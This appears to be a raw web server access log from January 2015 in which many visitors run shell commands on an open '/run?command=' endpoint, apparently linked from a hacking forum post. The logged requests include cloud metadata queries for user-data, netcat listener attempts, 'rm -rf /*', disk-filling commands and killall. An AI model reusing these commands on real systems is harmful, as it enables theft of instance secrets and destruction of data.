31.16.77.135 - - [19/Jan/2015:13:06:11 +0000] "GET /run?command=ls%20-l HTTP/1.1" 200 387 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
194.25.90.180 - - [19/Jan/2015:13:07:03 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9073 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:07:08 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9073 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:07:35 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:07:40 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:07:42 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:35 +0000] "GET /run?command=yes%20%3E%20yesyesyes;& HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:38 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:43 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:44 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:44 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:45 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:45 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:46 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:46 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:46 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:47 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:47 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:48 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:48 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:48 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9073 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:49 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9073 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:49 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9073 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:50 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9073 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:08:50 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 9073 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:12 +0000] "GET /run?command=fallocate%20-l%20100G%20funny HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:15 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:20 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:20 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:23 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:23 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:24 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:24 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:25 +0000] "GET /run?command=ps%20-aux HTTP/1.1" 200 8901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:30 +0000] "GET /run?command=df%20-h HTTP/1.1" 200 371 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:33 +0000] "GET /run?command=df%20-h HTTP/1.1" 200 371 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:34 +0000] "GET /run?command=df%20-h HTTP/1.1" 200 371 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:36 +0000] "GET /run?command=df%20-h HTTP/1.1" 200 371 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:09:36 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
194.25.90.180 - - [19/Jan/2015:13:09:40 +0000] "GET /run?command=df%20-h HTTP/1.1" 200 371 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:09:43 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
194.25.90.180 - - [19/Jan/2015:13:09:49 +0000] "GET /run?command=cat%20/etc/networking HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:09:53 +0000] "GET /run?command=ifconfig HTTP/1.1" 200 901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:09:57 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://www.google.com/url?q=http%3A%2F%2F54.154.158.219%2Frun%3Fcommand%3Dls&sa=D&sntz=1&usg=AFQjCNEzpT7L63YI23KD_O_23t8jkZUeZg" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:09:58 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:10:04 +0000] "GET /run?command=ssh HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.131.108.192 - - [19/Jan/2015:13:10:06 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://www.reddit.com/r/hacking/comments/2sv2jh/this_is_running_on_my_server_do_whatever_you_like/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.131.108.192 - - [19/Jan/2015:13:10:06 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:10:09 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:10:49 +0000] "GET /run?command=ifconfig HTTP/1.1" 200 901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
58.160.147.88 - - [19/Jan/2015:13:10:58 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 4.4.4; D5833 Build/23.0.A.2.93) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
58.160.147.88 - - [19/Jan/2015:13:10:58 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 4.4.4; D5833 Build/23.0.A.2.93) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:11:23 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/instance-type HTTP/1.1" 200 8 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:11:36 +0000] "GET /run?command=ifconfig%20/all HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:11:39 +0000] "GET /run?command=ifconfig HTTP/1.1" 200 901 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:11:52 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:11:58 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/instance-type HTTP/1.1" 200 8 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:12:02 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:12:13 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
150.70.172.231 - - [19/Jan/2015:13:12:13 +0000] "GET /run?command=sleep%25203 HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
78.172.44.50 - - [19/Jan/2015:13:12:16 +0000] "GET /run?command=/run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:12:22 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:12:24 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:12:24 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:12:38 +0000] "GET /run?command=ls HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:12:38 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:12:42 +0000] "GET /run?command=ls%20/home HTTP/1.1" 200 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:12:53 +0000] "GET /run?command=ls%20/home/ubuntu/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:00 +0000] "GET /run?command=ls%20/home/python HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:05 +0000] "GET /run?command=ls%20/home/ HTTP/1.1" 200 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
158.222.249.207 - - [19/Jan/2015:13:13:11 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
158.222.249.207 - - [19/Jan/2015:13:13:12 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
158.222.249.207 - - [19/Jan/2015:13:13:12 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:13:14 +0000] "GET /run?command=pwd HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.102.31.138 - - [19/Jan/2015:13:13:15 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.102.31.138 - - [19/Jan/2015:13:13:15 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
58.160.147.88 - - [19/Jan/2015:13:13:16 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 4.4.4; D5833 Build/23.0.A.2.93) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
58.160.147.88 - - [19/Jan/2015:13:13:16 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 4.4.4; D5833 Build/23.0.A.2.93) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
158.222.249.207 - - [19/Jan/2015:13:13:18 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:13:19 +0000] "GET /run?command=cd%20/home/python HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:21 +0000] "GET /run?command=pwd HTTP/1.1" 200 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:13:25 +0000] "GET /run?command=1%20&&%20nc%20-vvnlp HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:13:26 +0000] "GET /run?command= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:29 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:13:30 +0000] "GET /run?command=nc%20-vvnlp HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
31.16.77.135 - - [19/Jan/2015:13:13:33 +0000] "GET /run?command=ls%20-l HTTP/1.1" 200 388 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:13:39 +0000] "GET /run?command=sudo%20echo%20test HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:45 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:53 +0000] "GET /run?command=touch%20a HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:55 +0000] "GET /run?command= HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:13:58 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:14:12 +0000] "GET /run?command=rm%20-rf%20/* HTTP/1.1" 200 17 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
150.70.173.14 - - [19/Jan/2015:13:14:14 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 345 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
150.70.173.46 - - [19/Jan/2015:13:14:14 +0000] "GET /run?command=/run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
82.102.31.138 - - [19/Jan/2015:13:14:19 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.102.31.138 - - [19/Jan/2015:13:14:20 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:14:23 +0000] "GET /run?command=echo%20$PID HTTP/1.1" 200 1 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:14:29 +0000] "GET /run?command=echo%20$PPID HTTP/1.1" 200 6 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:14:34 +0000] "GET /run?command=ls%20-l%20as HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
31.16.77.135 - - [19/Jan/2015:13:14:40 +0000] "GET /run?command=cat%20%22asd%22 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
82.102.31.138 - - [19/Jan/2015:13:14:41 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:14:42 +0000] "GET /run?command=cat%20asd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:14:43 +0000] "GET /run?command=ps HTTP/1.1" 200 91 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:14:46 +0000] "GET /run?command=echo%20%22what%22 HTTP/1.1" 200 5 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
31.16.77.135 - - [19/Jan/2015:13:14:50 +0000] "GET /run?command=echo%20%22nc%20-vvnlp%22 HTTP/1.1" 200 10 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
148.235.187.243 - - [19/Jan/2015:13:14:52 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
148.235.187.243 - - [19/Jan/2015:13:14:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:14:56 +0000] "GET /run?command=echo%20%22nc%20-vvnlp%22%20&&%20echo%20%22test%22 HTTP/1.1" 200 10 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
31.16.77.135 - - [19/Jan/2015:13:14:59 +0000] "GET /run?command=echo%20%22nc%20-vvnlp%22%20and%20echo%20%22test%22 HTTP/1.1" 200 55 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
148.235.187.243 - - [19/Jan/2015:13:15:04 +0000] "GET /run?command=killall HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
